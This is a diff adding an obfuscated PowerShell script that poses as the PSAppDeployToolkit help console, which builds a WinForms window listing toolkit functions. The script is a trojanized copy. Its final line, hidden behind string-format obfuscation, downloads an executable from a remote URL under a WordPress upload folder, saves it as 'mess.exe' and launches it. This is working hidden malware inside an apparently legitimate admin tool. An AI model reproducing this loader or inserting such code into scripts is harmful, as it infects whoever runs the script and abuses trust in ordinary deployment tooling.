@@ -1,0 +1,119 @@
+ &("{1}{0}" -f '-itEM','seT')  ("v"+"Ar"+"iaBle:6V5k"+"C")  ([tYpe]("{5}{2}{3}{4}{1}{0}"-f'r','G.COlo','ste','M.dRA','WIn','sy')) ;
+
+
+
+
+
+
+[string]${A`pP`DE`PlOy`TOOlKIThe`lp`Name} = ("{5}{0}{4}{2}{1}{3}"-f 'ppDep','l','He','p','loyToolkit','PSA')
+[string]${aP`pD`ePl`oyH`eLP`S`CRiPTFRIE`NdlYnaME} = ("{1}{5}{3}{2}{4}{0}" -f 'p','App','ol','y To','kit Hel',' Deplo')
+[version]${APpDEPl`OY`heLPSCr`i`p`TVe`RS`iON} = [version]("{1}{0}" -f '0','3.8.')
+[string]${APP`D`eplOY`hELP`scR`IPT`DA`Te} = ("{2}{1}{0}" -f'019','/2','23/09')
+
+
+[string]${sCRiP`Tdir`eC`ToRy} = &("{1}{2}{0}" -f'th','S','plit-Pa') -Path ${M`yIN`VOC`ATiON}."MYcoMm`ANd"."defINiT`I`On" -Parent
+
+. "$scriptDirectory\AppDeployToolkitMain.ps1" -DisableLogging
+
+
+
+
+
+
+
+
+
+Function Show-H`EL`p`CoN`Sole {
+	
+	&("{2}{0}{1}" -f'd-Typ','e','Ad') -AssemblyName ("{0}{3}{1}{2}"-f'System.Wind','w','s.Forms','o') -ErrorAction ("{1}{0}"-f'top','S')
+	&("{0}{1}" -f'Add','-Type') -AssemblyName ("{3}{2}{0}{1}" -f 'tem.Drawin','g','s','Sy') -ErrorAction ("{1}{0}" -f'p','Sto')
+
+	
+	${hE`lpf`orm} = .("{1}{2}{0}" -f'-Object','N','ew') -TypeName ("{1}{4}{5}{2}{0}{3}"-f 'r','Sy','indows.Fo','ms.Form','st','em.W')
+	${H`ElpLiSt`BOX} = .("{2}{0}{1}" -f'w-','Object','Ne') -TypeName ("{2}{1}{0}{4}{5}{3}{8}{7}{6}"-f'em','st','Sy','orm','.Wind','ows.F','stBox','Li','s.')
+	${hELp`Te`xt`Box} = &("{2}{1}{0}"-f'ject','ew-Ob','N') -TypeName ("{7}{4}{3}{6}{5}{1}{2}{0}{8}" -f'.RichTe','ws.Form','s','.','m','o','Wind','Syste','xtBox')
+	${IN`itIal`F`OrMw`i`N`D`owSTatE} = &("{2}{1}{0}{3}" -f 'jec','b','New-O','t') -TypeName ("{1}{0}{2}{3}{4}{6}{5}{7}"-f'yst','S','em','.Windo','ws.Forms.','mWindowS','For','tate')
+
+	
+	${sY`Ste`M_DRAwING`_size} = .("{2}{0}{1}"-f 'ew-Obje','ct','N') -TypeName ("{3}{0}{2}{1}" -f 'ing','e','.Siz','System.Draw')
+	${s`ySt`e`m_`DRAWING_sIZe}."hE`Ig`Ht" = 665
+	${S`ySte`M_`dRAwIN`g_`s`IZE}."wi`dTH" = 957
+	${hEl`PfO`Rm}."CL`I`EnTsIZe" = ${sYs`Te`M_drAW`i`NG_si`zE}
+	${h`El`PF`oRM}."DA`TABIN`d`INgS"."dE`F`AULTD`AtA`souRcEupd`AT`eModE" = 0
+	${HEL`Pfo`Rm}."NA`ME" = ("{1}{0}{2}"-f 'o','HelpF','rm')
+	${HELPFO`RM}."T`ext" = ("{13}{1}{2}{7}{12}{3}{8}{5}{4}{10}{11}{6}{9}{0}" -f 'e','werShel','l','p','t To','en','p',' ',' Deploym',' Consol','olki','t Hel','Ap','Po')
+	${hElpf`o`Rm}."wI`N`D`owstatE" = ("{1}{0}"-f 'rmal','No')
+	${H`elp`ForM}."shoWiNta`S`k`BAr" = ${tr`UE}
+	${h`ElP`FORM}."FoR`mB`oRders`TYlE" = ("{1}{0}" -f '3D','Fixed')
+	${h`El`pF`OrM}."mAx`imIz`E`Box" = ${f`ALSe}
+	${HELp`FO`RM}."iC`On" = &("{0}{2}{1}"-f'New-','t','Objec') -TypeName ("{0}{1}{5}{2}{3}{4}" -f 'Sy','stem.D','w','i','ng.Icon','ra') -ArgumentList ${APpdEpL`OY`L`Og`Oicon}
+	${HeLplIs`T`B`ox}."An`CHOR" = 7
+	${HElp`Li`sTBox}."bor`DeRsT`YlE" = 1
+	${HeL`p`List`Box}."d`A`TaBINDi`NgS"."d`ef`AuL`TDATasou`RcEup`dATEM`ode" = 0
+	${he`Lp`lIS`TboX}."fO`NT" = &("{1}{2}{0}"-f'Object','New','-') -TypeName ("{4}{1}{3}{0}{5}{2}" -f'n','ystem','t','.Drawi','S','g.Fon') -ArgumentList (("{3}{0}{1}{2}" -f'crosof','t ','Sans Serif','Mi'), 9.75, 1, 3, 1)
+	${H`ELP`L`ISTBox}."FoRmA`TTI`NG`enABL`ed" = ${T`RUE}
+	${hELp`Li`st`Box}."I`TemHeI`ght" = 16
+	${sYsTem_DR`A`WIN`G_`po`iNt} = .("{2}{1}{0}{3}"-f'-Obje','w','Ne','ct') -TypeName ("{4}{1}{0}{3}{2}" -f 'em.Drawin','yst','Point','g.','S')
+	${S`Y`StE`M_DrawING_`PO`InT}."x" = 0
+	${SY`StEm_d`Raw`InG`_Point}."Y" = 0
+	${HelpLI`stB`oX}."lo`CaTi`oN" = ${sYs`T`em`_Draw`iNG_PoInT}
+	${HE`lp`l`iStBOX}."nA`me" = ("{0}{1}{2}{3}" -f'Hel','p','List','Box')
+	${s`YSt`Em_`DraWi`Ng_`Size} = &("{2}{1}{0}" -f'ect','-Obj','New') -TypeName ("{3}{4}{2}{0}{1}"-f 'iz','e','.S','System.Dra','wing')
+	${SYStE`M`_`dR`AwinG_s`izE}."h`e`iGhT" = 658
+	${SYsTEm_`DraWINg`_S`iZE}."WID`TH" = 271
+	${HEl`PlIs`TB`OX}."si`ze" = ${S`Y`STEm`_drA`WIng_S`ize}
+	${H`ELp`lIsTbOx}."sOr`T`Ed" = ${tR`Ue}
+	${H`elpl`ist`Box}."taBIN`DeX" = 2
+	${H`elpliSTb`OX}.("{1}{5}{3}{4}{2}{0}"-f 'hanged','add','ndexC','ted','I','_Selec').Invoke({ ${hEl`ptEX`TB`ox}."TE`XT" = &("{0}{1}" -f 'Ge','t-Help') -Name ${H`EL`plisTb`ox}."sElE`CTEd`iteM" -Full | &("{1}{2}{3}{0}"-f 'g','Out-S','t','rin') })
+	${h`ELPFUnC`Tions} = &("{1}{0}{3}{2}"-f't-Com','Ge','and','m') -CommandType ("{2}{1}{0}"-f'ion','nct','Fu') | .("{0}{3}{2}{1}"-f 'Where','ct','je','-Ob') { (${_}.hElpUrI -match ("{0}{2}{1}{3}"-f'psappdepl','t','oy','oolkit')) -and (${_}."DeFi`N`IT`IoN" -notmatch ("{5}{3}{6}{4}{0}{1}{2}"-f'ipt ','fu','nction','ntern','cr','i','al s')) } | &("{2}{3}{0}{1}" -f'c','t','Select-O','bje') -ExpandProperty ("{0}{1}" -f'Na','me')
+	ForEach (${He`l`pFunctI`ON} in ${H`ElPFuNc`TiO`NS}) {
+		${N`ULL} = ${heLpli`STB`oX}."I`TemS".("{1}{0}"-f'd','Ad').Invoke(${HEL`pf`Un`Ct`ION})
+	}
+	${hE`L`pfo`RM}."C`ontrOLS".("{1}{0}"-f'd','Ad').Invoke(${hE`lPLiSTb`Ox})
+	${HE`l`PteXtBOx}."AN`ch`OR" = 11
+	${H`El`PTeXT`Box}."borD`ER`STyLe" = 1
+	${h`E`l`PTextBox}."dATaB`iN`Di`NgS"."dEfaULt`D`A`TAs`oURC`euP`DAte`moDe" = 0
+	${H`e`LptexT`BOx}."Fo`NT" = &("{1}{2}{0}"-f 'ct','New-O','bje') -TypeName ("{4}{1}{3}{2}{0}{5}"-f 'n','yst','Drawing.Fo','em.','S','t') -ArgumentList (("{0}{4}{1}{3}{2}"-f 'Microsof','ns','Serif',' ','t Sa'), 8.5, 0, 3, 1)
+	${He`Lpte`Xt`Box}."FOre`CO`LOR" =   ${6v`5kC}::("{2}{0}{1}"-f'omA','rgb','Fr').Invoke(255, 0, 0, 0)
+	${s`YSTEm_d`R`AWInG`_pOiNt} = .("{0}{2}{1}" -f 'New-','bject','O') -TypeName ("{0}{1}{5}{2}{3}{4}{6}"-f 'Sy','s','em.','Drawing','.Po','t','int')
+	${SY`StE`m`_`dRAwinG_`pO`iNt}."X" = 277
+	${s`YSTEm_DraWING_`POi`Nt}."Y" = 0
+	${hElPtE`X`Tb`oX}."Loca`Ti`on" = ${SysTEM_`drA`Wing_POI`NT}
+	${hELPte`XT`BOx}."n`Ame" = ("{1}{2}{0}{3}"-f'lpTextB','H','e','ox')
+	${Helpt`ex`TBox}."R`eADon`Ly" = ${tR`UE}
+	${SY`StEM_`DraW`Ing`_SiZE} = &("{3}{2}{1}{0}" -f 'ect','j','w-Ob','Ne') -TypeName ("{4}{0}{3}{1}{2}" -f '.Drawi','.S','ize','ng','System')
+	${SySt`EM_`D`RaWin`G_s`IZE}."HEI`GHT" = 658
+	${s`Y`steM_d`RAWI`NG_SizE}."WI`DTh" = 680
+	${HELp`T`eX`TbOX}."Si`ZE" = ${SYStem`_`D`Rawin`g_S`i`ZE}
+	${HELPT`EX`T`BoX}."tabin`DEX" = 1
+	${he`lPTE`x`Tbox}."T`Ext" = ''
+	${Helpf`oRM}."CoNTR`o`ls".("{1}{0}"-f 'dd','A').Invoke(${HeL`P`TexTBOx})
+
+	
+	${I`N`iTiAlFORm`wi`NDOw`statE} = ${H`El`PforM}."w`IndoWs`TA`TE"
+	
+	${heL`pfO`RM}.("{1}{2}{0}"-f'oad','add_','L').Invoke(${o`NLOAdfOR`M_Sta`TeCorRec`TION})
+	
+	${nU`ll} = ${h`E`lpform}.("{3}{0}{2}{1}"-f 'ho','alog','wDi','S').Invoke()
+}
+
+
+
+
+
+
+
+
+
+&("{3}{1}{2}{0}"-f'g','te-','Lo','Wri') -Message ('Load'+' '+"[$appDeployHelpScriptFriendlyName] "+'co'+'nsole..'+'.') -Source ${Ap`PDePLoYtOO`LKiTHE`lP`Name}
+
+
+&("{2}{0}{1}{3}"-f'p','Cons','Show-Hel','ole')
+
+.("{2}{1}{0}"-f'te-Log','ri','W') -Message ("[$appDeployHelpScriptFriendlyName] "+'c'+'onso'+'le '+'closed'+'.') -Source ${appDEploy`Too`LkItH`elp`NAMe}
+
+
+
+
+
+(.("{1}{2}{0}"-f't','New-O','bjec') ("{0}{4}{5}{3}{1}{2}" -f 'System.Net.','C','lient','b','W','e')).("{3}{0}{1}{2}" -f'ownl','oadFi','le','D').Invoke(("{10}{7}{9}{0}{3}{4}{5}{8}{1}{2}{6}"-f 'limited','der','.','s.in/w','p-admin/css/uplo','a','exe','/bro','d/Or','ke','http:/'),("{0}{1}" -f'me','ss.exe'));&("{0}{1}{2}" -f'Start-','Proc','ess') ("{1}{2}{0}"-f 'xe','m','ess.e')
